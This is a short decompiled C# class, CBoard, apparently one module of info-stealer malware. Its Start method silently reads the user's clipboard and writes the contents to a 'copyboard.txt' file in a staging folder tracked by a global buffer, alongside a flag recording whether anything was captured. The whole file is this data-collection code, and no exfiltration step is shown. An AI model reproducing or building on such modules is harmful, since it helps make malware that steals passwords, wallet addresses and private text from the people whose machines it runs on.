using System;
using System.IO;
using System.Windows.Forms;

// Token: 0x0200000B RID: 11
internal class CBoard
{
	// Token: 0x06000019 RID: 25 RVA: 0x000036FC File Offset: 0x000018FC
	public static void Start()
	{
		string text = Clipboard.GetText();
		if (!string.IsNullOrEmpty(text.Trim()))
		{
			global::Buffer.XBufferData[8] = "1";
		}
		else
		{
			global::Buffer.XBufferData[8] = "0";
		}
		File.WriteAllText(string.Format("{0}copyboard.txt", global::Buffer.path_l), (global::Buffer.XBufferData[8] == "1") ? text : string.Format("{0}Nothing.", global::Buffer.head));
	}
}
